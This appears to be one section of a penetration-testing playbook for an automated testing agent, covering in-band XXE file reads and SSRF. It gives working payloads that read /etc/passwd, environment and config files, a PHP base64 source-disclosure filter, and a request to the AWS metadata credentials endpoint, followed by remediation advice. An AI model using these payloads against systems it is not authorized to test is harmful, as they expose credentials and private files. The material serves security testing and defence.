# XXE — in-band file read & SSRF

Precondition: the endpoint parses your XML AND either reflects an element's value
back, or errors in a way that leaks it (no reflection → error-based/blind, `30`).

## Classic file read (a field is echoed)
Put the entity reference where a reflected value goes. If the response echoes, say,
a `<productId>` you submitted, target THAT element:
```
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
`root:.*:0:0:` in the response ⇒ XXE file read. Other targets:
`file:///etc/hostname`, `file:///c:/windows/win.ini`, `file:///proc/self/environ`,
`file:///proc/self/cwd/` (app dir), and the app's own config
(`file:///var/www/html/config.php`, `WEB-INF/web.xml`, `application.properties`).

Send it with `http_request`, `Content-Type: application/xml` (or the endpoint's —
SOAP wants `text/xml` plus a `SOAPAction`), body = the doc above. Read the reflected
value back from `http_flow_body`.

## PHP: read source without breaking the parse
Raw source contains `<`/`&` that breaks XML — route it through a base64 filter so it
returns as inert base64 you decode in `browser_evaluate_js` (`atob`):
```
<!DOCTYPE r [ <!ENTITY xxe SYSTEM
  "php://filter/convert.base64-encode/resource=index.php"> ]>
```
Only fires when the app actually re-enabled entities (see `00`).

## SSRF through the SYSTEM identifier
Swap `file://` for `http://` — the *parser* makes the request, from inside the
network:
```
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">                     internal service
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">  AWS
```
Reflected metadata/creds ⇒ SSRF via XXE. GCP metadata needs a request header the
parser can't set, so GCP-over-XXE usually fails — note it and pivot to a real SSRF
param. IP/scheme filter bypasses live in `70`.

## When you can't add a DOCTYPE
If the server wraps your input inside its own root element (common in SOAP), you
can't declare entities — jump to XInclude in `30`.

Evidence: the file's bytes / metadata creds in the response body from the journal.
Remediation: disable DOCTYPE & external entities (Java
`disallow-doctype-decl=true`; PHP: don't re-enable; .NET `DtdProcessing=Prohibit`,
`XmlResolver=null`), or use a `defusedxml`-class library.
